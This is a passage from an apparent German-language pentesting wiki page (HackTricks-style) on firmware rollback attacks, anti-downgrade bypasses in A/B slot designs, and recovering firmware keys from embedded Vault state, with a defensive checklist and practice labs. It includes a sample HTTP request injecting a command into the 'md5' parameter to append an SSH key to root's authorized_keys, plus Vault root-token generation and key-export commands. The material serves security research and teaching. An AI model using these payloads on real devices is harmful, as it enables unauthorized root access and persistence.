Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der **Schutz vor Versions-Rollback (Downgrade)** häufig ausgelassen. Wenn der Boot- oder Recovery-Loader die Signatur lediglich mit einem eingebetteten öffentlichen Schlüssel prüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer legitimerweise eine **ältere, verwundbare Firmware mit gültiger Signatur installieren** und dadurch bereits behobene Schwachstellen wieder einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres signiertes Image beschaffen**
   * Von einem öffentlichen Download-Portal, einem CDN oder einer Support-Website des Herstellers herunterladen.
   * Aus zugehörigen Mobil- oder Desktop-Anwendungen extrahieren (z. B. aus `assets/firmware/` in einem Android-APK).
   * Aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. abrufen.
2. **Das Image über einen verfügbaren Update-Kanal auf das Gerät hochladen oder bereitstellen:**
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele IoT-Geräte für Verbraucher bieten **nicht authentifizierte** HTTP(S)-Endpunkte, die Base64-codierte Firmware-Blobs entgegennehmen, serverseitig decodieren und eine Recovery bzw. ein Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in der neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Command-Injection-Filter).
4. Optional das neueste Image zurückflashen oder Updates deaktivieren, um eine Entdeckung zu vermeiden, sobald Persistence erreicht wurde.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der anfälligen (zurückgestuften) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch beliebige Befehle eingeschleust werden können (hier: Aktivierung des Root-Zugriffs per SSH-Schlüssel). In späteren Firmware-Versionen wurde ein einfacher Zeichenfilter eingeführt, doch ohne Downgrade-Schutz ist die Fehlerbehebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Anbieter bündeln vollständige Firmware-Images in ihren begleitenden mobilen Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind häufig unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzurühren.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only-Umgehung des Anti-Rollback-Schutzes bei A/B-Slot-Designs

Einige Anbieter implementieren zwar einen Anti-Downgrade-**Ratchet**, aber nur innerhalb der *Updater*-Logik (zum Beispiel eine UDS-Routine über CAN, einen Recovery-Befehl oder einen OTA-Agent im Userspace). Wenn der **Bootloader** später nur die Image-Signatur/CRC prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, lässt sich der Rollback-Schutz weiterhin umgehen.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Ratchet des Images mit einem in persistentem Speicher abgelegten Wert und weist ältere signierte Images zurück.
- Der Bootloader **wertet diesen Ratchet nicht aus** und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem Generation-Zähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten validierten Firmware-Digest gebunden**.

Dadurch entsteht in Dual-Slot-Systemen eine Primitive nach dem Muster **ein Image validieren / ein anderes Image booten**. Kann der Angreifer den Updater dazu bringen, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel festzulegen und Slot B später vor dem Neustart zu überschreiben, bootet der Bootloader möglicherweise trotzdem das heruntergestufte Image, da er nur den bereits gesetzten Slot-Metadaten vertraut.

Häufiges Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Wechselroutine ausführen, damit das Layout diesen Slot als nächsten aktiven Slot markiert.
2. **Noch nicht neu starten**. In derselben Sitzung die Slot-Vorbereitungs-/Löschroutine erneut aufrufen.
3. Veraltete Boot-Status- oder Slot-Auswahllogik ausnutzen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine umgehen, die den Ratchet durchsetzt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf beim Reverse Engineering von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einem erfolgreichen Wechsel nicht aktualisiert werden.
- Eine Routine im Stil von `prepare_passive_slot()`, die einen Slot anhand veralteten Zustands statt des **aktuell gesetzten Layouts** löscht.
- Eine Funktion im Stil von `part_write_layout()`, die nur einen **Generation-Zähler** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht in ROM / Bootloader / Secure-Boot-Stufen**.
- Lösch- oder Recovery-Routinen, die den Slot weiterhin als bootfähig markieren, obwohl sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *Update-Endpunkts* angemessen geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. Signaturprüfung durch ROM-Code)?
* Erzwingt der **Bootloader denselben Ratchet** wie der Updater, statt nur Signatur/CRC zu prüfen?
* Sind die Metadaten zur Slot-Aktivierung **an den validierten Firmware-Digest/die Version gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Muss das Gerät nach einem erfolgreichen Slot-Wechsel zwingend neu starten, oder sind spätere Update-/Löschroutinen in derselben Sitzung weiterhin erreichbar?
* Führt der Userspace-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik wieder?

> 💡  Fehlt eines der oben genannten Elemente, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, können die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt dienen.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellen von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Zustand

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, sollte vor jedem Brute-Force-Versuch zunächst eine Container-Triage erfolgen:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` weist üblicherweise auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind das Salt, die restlichen Bytes der Ciphertext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, ist ein starker Hinweis darauf, dass ein RSA-2048-Ciphertext einen zufälligen Firmware-Passwort-/Sitzungsschlüssel verschlüsselt.
- Separates PGP-Material in derselben Datei dient häufig nur der Authentizität; nicht davon ausgehen, dass es für die Vertraulichkeit sorgt.

Wenn die Suche nach statischen Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) fehlschlägt, sollte stattdessen der **operative Entschlüsselungspfad** zurückverfolgt werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater / die Verwaltungs-Binärdatei dekompilieren und nachvollziehen, wer den verschlüsselten Blob liest, welcher Helper/welche API ihn entpackt und welchen logischen Schlüsselnamen angefordert wird.
- Das extrahierte Root-Dateisystem nach KMS-Zustand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie Unit-Dateien und Init-Skripten durchsuchen.
- Klartext-Befehle wie `vault operator unseal ...`, Recovery-Schlüssel, Bootstrap-Token oder lokale KMS-Auto-Unseal-Skripte als gleichwertig mit privatem Schlüsselmaterial behandeln.

Wenn das Gerät die originale Vault-Binärdatei und das Storage-Backend mitliefert, ist es normalerweise einfacher, diese Umgebung nachzustellen, als die Vault-Interna neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Schlüssel nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit genau dem vom KMS verwendeten Padding-/Hash-Paar testen. Ein fehlgeschlagener PKCS#1-v1.5-Decrypt und ein fehlgeschlagener standardmäßiger OAEP-Decrypt beweisen **nicht**, dass der Schlüssel falsch ist; viele Vault-gestützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 verwenden.
- Beginnt der Payload mit `Salted__`, den OpenSSL-KDF des Herstellers exakt nachbilden (`EVP_BytesToKey`, bei älteren Appliances oft MD5), bevor du versuchst, AES-CBC zu entschlüsseln.

So wird aus „verschlüsselter Firmware“ ein allgemeineres Problem: **die betrieblichen Schlüssel auf Appliance-Seite wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline nachbilden**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Senior-Level-Können, Junior-Level-Autonomie](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der maßgebliche Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in aufgegebener Hardware ausnutzen – Trail-of-Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf dein Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mich: Jetzt bist du gehackt](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über seinen Ladeanschluss ausnutzen – Teil 2: Umgehung des Anti-Downgrades](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 2: Debuggen und Fehler beheben](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
